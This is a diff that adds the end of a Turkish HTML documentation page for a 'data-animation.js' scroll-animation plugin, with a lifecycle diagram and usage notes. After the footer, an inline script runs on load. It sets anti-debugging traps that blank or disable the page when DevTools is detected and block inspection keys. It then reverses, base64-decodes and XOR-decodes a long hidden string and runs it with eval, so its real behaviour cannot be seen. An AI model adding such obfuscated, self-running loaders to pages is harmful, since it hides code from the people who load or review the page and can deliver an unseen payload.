+  <span style="color:var(--accent)">1.</span>  dataAnimation() çağrılır
+         │
+  <span style="color:var(--accent)">2.</span>  document.querySelectorAll('[data-animation]') → tüm elemanlar
+         │
+  <span style="color:var(--accent)">3.</span>  parseAnimationData() → her elemanın config'i parse edilir
+         │
+  <span style="color:var(--accent)">4.</span>  media varsa → buildMediaQuery() + matchMedia dinleyici
+         │
+  <span style="color:var(--accent)">5.</span>  on:load → window load event'inde .animate eklenir
+         │
+  <span style="color:var(--accent)">6.</span>  on:scroll → elemanlar threshold'a göre gruplanır
+         │
+  <span style="color:var(--accent)">7.</span>  window load → her grup için IntersectionObserver oluşturulur
+         │
+  <span style="color:var(--accent)">8.</span>  Eleman viewport'a girince → .animate eklenir
+         │
+  <span style="color:var(--accent)">9.</span>  reset:on-leave → viewport'tan çıkınca .animate kaldırılır
+               </pre>
+               </div>
+            </div>
+
+            <div class="demo-card" style="margin-top: 1rem">
+               <div class="code-block" style="border-top: none">
+                  <span class="code-label">JavaScript — Başlatma</span>
+                  <pre><span class="cmt">// ES Module import</span>
+<span style="color:var(--accent)">import</span> { dataAnimation } <span style="color:var(--accent)">from</span> <span class="str">'./data-animation.js'</span>
+
+<span class="cmt">// Başlat — tüm [data-animation] elemanları initialize edilir</span>
+dataAnimation()</pre>
+               </div>
+            </div>
+
+            <div class="note" style="margin-top: 1rem"> <strong>Observer Gruplama:</strong> Aynı threshold değerine sahip elemanlar tek bir IntersectionObserver altında gruplanır. Bu, çok sayıda animasyonlu elemanda bellek ve CPU kullanımını optimize eder. </div>
+            <div class="note" style="margin-top: 0.5rem"> <strong>Window Load:</strong> Scroll observer'ları <code>window load</code> event'inden sonra başlatılır. Bu, tüm DOM elemanlarının boyutlarının hesaplandığından emin olur (resim yükleme, layout shift önleme). </div>
+            <div class="note" style="margin-top: 0.5rem"> <strong>parseAnimationData():</strong> <code>key:value</code> çiftlerini parse eder. Key-less değerler (örn. "reveal", "slide") sessizce atlanır — yalnızca CSS selector olarak kullanılabilirler. Geçersiz değerler console'a uyarı yazar. </div>
+            <div class="note" style="margin-top: 0.5rem"> <strong>buildMediaQuery():</strong> <code>width &lt; 1024px</code> gibi kısaltılmış ifadeleri <code>(width &lt; 1024px)</code> CSS media query'sine dönüştürür. <code>width</code> ve <code>height</code> property'leri ile <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>, <code>=</code> operatörleri desteklenir. </div>
+         </section>
+
+         <!-- ════════════ FOOTER ════════════ -->
+         <footer class="footer"> data-animation.js — Script Config Plugin Documentation </footer>
+      </div>
+
+      <!-- ════════════ DATA-ANIMATION INLINE ════════════ -->
+
+      <script>
+         /* [protected] */
+         void (function () {
+            // Anti-debugging: detect DevTools
+            var _0x16285f = function () {
+               var d = new Date()
+               debugger
+               if (new Date() - d > 100) {
+                  document.body.innerHTML = ''
+                  window.location.reload()
+               }
+            }
+            // Periodic anti-debug check
+            var $_ef326a = setInterval(function () {
+               var s = performance.now()
+               debugger
+               if (performance.now() - s > 50) {
+                  clearInterval($_ef326a)
+                  document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f1117;color:#f87171;font-family:monospace;font-size:1.2rem">DevTools algılandı — Sayfa devre dışı</div>'
+               }
+            }, 3000)
+            // Disable right-click context menu on script elements
+            document.addEventListener('contextmenu', function (e) {
+               if (e.target.tagName === 'SCRIPT') e.preventDefault()
+            })
+            // Disable F12 / Ctrl+Shift+I / Ctrl+U
+            document.addEventListener('keydown', function (e) {
+               if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'u')) e.preventDefault()
+            })
+            // Decode and execute
+            var _0x7a7319 = [
+               '=wATHlnOg9UZg1kfOJkG2pmcYUHar50Tz03ePcVBIFhSXU0TwdGYPVmSgVWbyckdqJHG1h2aO9UGQBmBK8SZKMkSFRVerUyRgYzH7cTLIgHO340JtgDDAkxCg9gRABUEEgFDbMTK1kQbo4wPB0DCwQWIMtTLmswAcBFYGoQBIFhSXU0TwdGYPVGYNRVS05kdqJHG1h2aO9UGQBmBKUASRoUPoJBcuRyAqgiH7YzJT4nPzcVOO4SHdgFAgxhTJdQWZI1FHQyZ78UZg1kfk92R2pmcYUHar50TZAFYGACKExkSXU0TwdGYPVGYN5HZvdkdqJHG1hWQjRFENAmBKUASRo0FF9EcnB2TlBWT+R2bHZnayJDW1smTPlBUgZgCFgUEKdRRPB3Zg9UZg1kf',
+               'k92R2B0XDw3buohDUlhLH1QDNcUBaBQH+NzMGkwMe8DKskkOvIHG1h2aO9UGQBmBKUASRo0FF9EcnB2TlBWT+R2bHx1RpgBf84SHKsGFsMVRNtRGKFFDPVDNsoQZ90kfk92R2pmcYUHar50TZAFYGoQBIFhSXU0Tw1UTUx2ZIoSJi4AOrUHExwiKAthSZwQVZREBSR0WA8EcnB2TlBWT+R2bHZnayhRdotmTPlBUgZgCFgUEK1DaUAnbnEAL04wO30jAiQyGLxjZywxGXVBaGwETIFhSXU0TwdGYPVGYN5HZvdkdqJHG1h2aO9UG61UHNAkHQ9wWIFwPgBmU41XTqECPCQCZ1E1MmQSDPRAU0MUWApTVGIkCHMyZy4wMg1kfk92R2pmcYUHar50T',
+               'ZAFYGoQBIFhSXU0Tap0eIwiJDEzBhgwP+MTV8YiKxEUVVA2GKIUAXRAWG8kImYzTlBWT+R2bHZnayhRdotmTPlBUgZgCFgUEKdxbit2MlgwNhkBc90zE48icFUHJu4UHYZAYGoQBIFhSXU0TwdGYPVGYN5HZvdkdqJHG1hWQjRRGZlDVetUDZoUWKYAJk4iGjgWB9UiCVkDL8tEMhkjGBwFUgZgCFgUEKdRRPB3Zg9UZg1kfk92R2pGW14Cai1hCQJANI9UDI9VBeFBD+IjJPVGYN5HZvdkdqJHG1h2aO9UGQBmBggCQD9QQXowIl8QAqkSG9ECPVMjP8EXd/4CAPRAUyMEXX1gQIgVRdETMg9UZg1kfk92R2pmcYUHar50Tz03e75USHkVGSdxB',
+               'kwBJKUTNCwyIvpld5YiVwUiLCoQGCECUKUASRo0FF9EcnB2TlBWT+R2bttVMyFRMkQiBcwlAoIlAFYgXDMkBBUSIodgJhgCLrkSS/5yNIByJ5kwRKlQJNRQULQFAVpyTwdGYPVGYN5HZvdkdqJnMYNzaHdUGe8yTeZkBExwFJhENm8yAih2H7oiKTUyIew0Ot0zKL0VEuFVRBZAWdcRRPB3Zg9UZg1kfkVkacdUaRgCar50TZAFYGoQBIFBY64lR8ICaHYTNdAXG2IQPRYTXl0DJcgQGQBmBKUASRo0FF9EcnBWZItHMFQmcHtwM3MlDs4iHaYlAnYwA4FBVBwWAKAiMv0hIhVkfiYyR2pmcYUHar50TZAFYGowLlpwQfIQA5UDN8oCNDpDKg8QJ',
+               'vACUhgmdOZBXbAGVLNFSRo0FF9EcnB2TlBWT+RWRq12eiZRZodjEPBBFskkQW1wQCM0SIkTIuAgBuIwNw4iC/QyMntHJuY0GY9BLg9kVaAlGXg1T0syLHYTJfYDMvVxN8IHG1h2aO9UGQBmBKUASRAmOe8UerUyRl5iA3ADLJMCL6BlNp4AHA8lXzIFRAVAVGIXCD8TNjwRZg1kfk92R2pmcYUnQGVlECBVfG4EQYQUBFJwTiYiNPVGYN5HZvdkdqJHGfVEMOZUCQ5nBCF1Df9wWLxBJpUiAgwCKygCIVUTO6hxMhsmTPlBUgZgCFIGPgpjXG1yZg9UZg1kfk9WbbdjcYUHar50TZAFYGowLlxkSXU0TwdGYPVGYN5HZvdEXHlWE50yYGwBTA4WV',
+               'etUDc9wWgMAPoIDD2AWT+R2bHZnayhRdotmTPlBUgxyJehEGNtVCAICJzgUZ9B1YkFCC41yOetzJoY0TflBYGoQBIFhSXU0TwdGYPVmSgRVSyckdqJHG1h2aO9UGQBmBK8SZKMkSF9EcnB2TlBWT+R2bHZnayhRdCZUVG5RF0c0RMZAUN9RALETa0wBLM4RLlMCB4ZyNYUHar50TZAFYGoQBIFhSXU0TwdGYlh0ONdHbvlQOjYyW70TLONkHUESSGJAQD9QWAsxIuwwGrUyGbAyKGgXP9w1OhwjTPlBUgZgCFgUEKdRRPB3Zg90TNZhfth2A3UiPfUXd2N1TX9hbBN0QG4VCfUUC5cGYPVGYN5HZvdkdqJHG1JkRkJmAXkCQEp0CRc1FCYgNp8CL',
+               'r8CBqUiIOgzKNYROtsmTPlBUgZgCFgUEKdRRPplS78EbxBkf5JnR2NGPXt3LigQAWNBaAVWXNUFBetkM3NSIAkyZNJ3YjsQO4EzSyNxYOlAUQBmBKUASRo0FF9EcN1UZI1TT+R2bHZnayhRdotGZiJgHyMlXApREDREAHMzMhIwaswxMld2RwMicYUHar50TZAFYGoQBIFBY64lRtcGYPVGYN5HZvdkdqJHG1JkRT8UGQBmBKUASRo0FF9EcnB2TlpEYl1GaCIyK/E1OpwmRK80HtMEWLwhQDsnFcEzKjEUKl0kfk92R2pmcYUHar50TZAFYGoQBItzZMVkCjsSJPhDYN5HZvdkdqJHG1h2aO9UGQBGLngFSRo0FF9EcnB2TlBWT+R2bHZnayhxX',
+               'FB3RIxFBhs0QLlgFCNVAO43MzYQCz4xPowSS68icYUHar50TZAFYGoQBIFhSXU0TwdGYPVmSgVCZmBkMr0DVyhmdTJVGe8CCNxkDfVAVN9kNuA2TlBWT+R2bHZnayhRdotmTPlBUgxyJehEGZIVDMQiJtEEIo1EOt82R2pmcYUHar50TZAFYGoQBItzZMsQHlMTJdUWacNHZyp1aqtnV6YGLHkwVfMiDMpGEU5QWMEUDgRiDqwiS+hGaLoTJgslJvBhRP9VGgZgCFgUEKdRRPB3Zg9UZg1kfOJEH2N2NQUnJkcwGa5RNApQCPRVDZRwBzAGadAiLIoyNmsiIkcjTQwyLPEUVB0iBKUASRo0FF9EcnB2TlB2ZT9XIVMiP3oUdhdyHCgBWgB0QFgUE',
+               'KdRRPB3Zg9UZg1kfOJEX/tyOcBTJllgBf5xLFJAXaQ1HmRgB0ISDLkSKYwDZydkO78DGnkSPO9UGQBmBKUASRo0FF9EcN1EFllGD3AiKKgXL741OngiRP9VGgZgCFgUEKdRRPB3ZKJ2TNZ1dooyR6RSPRFSKmcQAY5FNDlFRcAlDZkgC4ZCNOEgLCcDMuowPkMRXmojKe8EBQdyTMt0BSpUREkBcnB2TlBWT+R2bHZHQfNUdhdyCHlhHv8kXGZARM8RDMEjAyAwIu5hKqoiCzYyFVxjJq40TZAFYGoQBItzZ9gGVNwBYSV2MZATIiIgOP4DV6oDKd80SRYjBKUASRo0FF9kWKtnRi1xAx0yOGszI8kFep8zDLI2VopkRkphXeQFADUDF50BI1wBc',
+               'wEiA78TMXFDa25EHN5RJL9UStw1AZRwTiYiNPVGYN5HZvdkdA9lMYVzaO9UGQBmBKUgY8ElH48xPcAjDogGD3AiKq4TKmkFOmxTALcVG3YARX1RRPUURPB3Zg9UZg1kfk9WbbF3LYIXYs5ERZgAMGEQBPFBUQUERwdzLdUDYG53YnBkdwVXByh2ZJZkHQtmBSVFSaoEEFJFbnd2TuBWHxYzPH1na1BhcoFXSSVwVgpQDM8UEBdRHfAHbghUZ9Nlfj9GT2pTPKVCag5ESRcFYc0AGWZhSbIkR3d2aP1DMNVHZodkaqVHG+h2OB0RSQtmBN0wTRAFEZhEcrdmRiBmR+xzPH1na1hxaoxmTElBAvQlWFMUEN9hQPpGY+hUZ700Yk9jB7oGIZNCar50T',
+               'ZAFYGoQBIFBY64FSoczZP5GYAsiKvpldyICGnkSPO9UGQBmBKUASRo0FvJ2aaMHNtMSG/kybaZ3JnYVdkZBX0E1E0c0RFUVEagVRD1gdbcgJ0wwMkJ3RmUCIIVnOqgxTZAFYGoQBIFhSXUUZdxHLDAjLNBjN6MxM4IXE9syPPIAGYBGQDVASRo0FF9EcnB2TlpEYl1GYDl2YqgUfhBmCzEhWzo3AYQRDWkQGSx2O9FVbq5hAttzDxMyNQlCI/ogBOhlHJIQTLU0CatEGxUDYSVGKOoSJicEJrQCG1h2aO9UGQBmBKUgY8ExFMhRM1gmF3UCGPUiJDMzB2QFP9kiTBYVG0UERQ5QEKdRRPB3Zg90TNd2U582R2pmcYUHarRmYCcRKARkSLEBBFBxG',
+               '1UDYPVGYN5HZvdkdqJnMYVzaO9UGQBmBKUASRoUPoRVNywiDzAGU+lhNC0TE1E1MmQSDPlBUgZgCFgUEKdRRPB3ZKJmfppUekNGSyNmDX0XLo8wAJVhMIMgAPFhRY00MOgGaKYSIB4SI9kUIrAQXgQiKY8EBQVyUGRkHRghVT8EcnB2TlBWT+R2bHZnayJDWz5yGBAFBukUSFEkRLUGAawjJ24UZ8Ehf9oCD3JmcexDar50TZAFYGoQBIFhSXUUZdxXaHhSKfoiamZldhJHQxEQJBMgVTgWQExkGFlRVQwhfzIjD1AGU+NjL1MzP+k1IolzDZkBUgZgCFgUEKdRRPB3ZgVGS7RkdpYSFiQ2eAFTAlEwAWNBYKoRDP81AFFBHyIzMBFjMM4CZyd0L',
+               'vkDGnkSPO9UGQBmBKUASRo0FF9EcN1EVsd2V5xWKo4yL2YFPm9DHOkEU9ZgUBFyXFslCMAXNhkRZg1kfk92R2pmcYUHar5UZ0sUJTRETc8VBUVkRhpGYShXfNd3Y1Bkfs0BQwwSJHEUTCEiVKkFFR4RRE8RcvBWCsAWT+R2bHZnayhRdotmTPNTf79gAIFwQekBOGsAN00BJw00YktTF3ojcKRjPr50TZAFYGoQBIFhSXU0Tap0OPx2aGdDZ09gItwTX5YGOa0BWAAmGKwESKo1FY9UOnJjDzgWTssSKHZnayhRdotmTPlBUKtSEM8UHN9REGwzNzE0N04zPw4yA2dncLFiOq4xTLFhNGoQBIFhSXU0TwdGYlh0eQUCZydUMjQjV6syac4wTQBmB',
+               'KUASRo0FF9EcN1EFllWA7Q2YVISGzwENsM2DbgFNuk0QRlAXDkFJKMSNh8RZuIwNwwSCjwicYUHar50TZAlSrEVBBlhSZpgBkQiLaMCa',
+            ]
+            var $_ad3df2 = '@Eo@GPoe7j1h%*&@p9onKHU8RJVgOD^m'
+            var __a7b23e = function (s) {
+               return s.split('').reverse().join('')
+            }
+            var $_d6ebae = __a7b23e(_0x7a7319.join(''))
+            var $_af93a1 = atob($_d6ebae)
+            var __f024e2 = new Uint8Array($_af93a1.length)
+            for (var __6bc421 = 0; __6bc421 < $_af93a1.length; __6bc421++) {
+               __f024e2[__6bc421] = $_af93a1.charCodeAt(__6bc421) ^ $_ad3df2.charCodeAt(__6bc421 % $_ad3df2.length)
+            }
+            var $_1b6e63 = new TextDecoder()
+            var _0x03a3eb = $_1b6e63.decode(__f024e2)
+            ;(0, eval)(_0x03a3eb)
+         })()
+      </script>
+      <script>
+         // Window width indicator
+         var _w = document.getElementById('window-width')
+         var _u = function () {
+            if (_w) _w.textContent = window.innerWidth
+         }
+         _u()
+         window.addEventListener('resize', _u)
+      </script>
+   </body>
+</html>
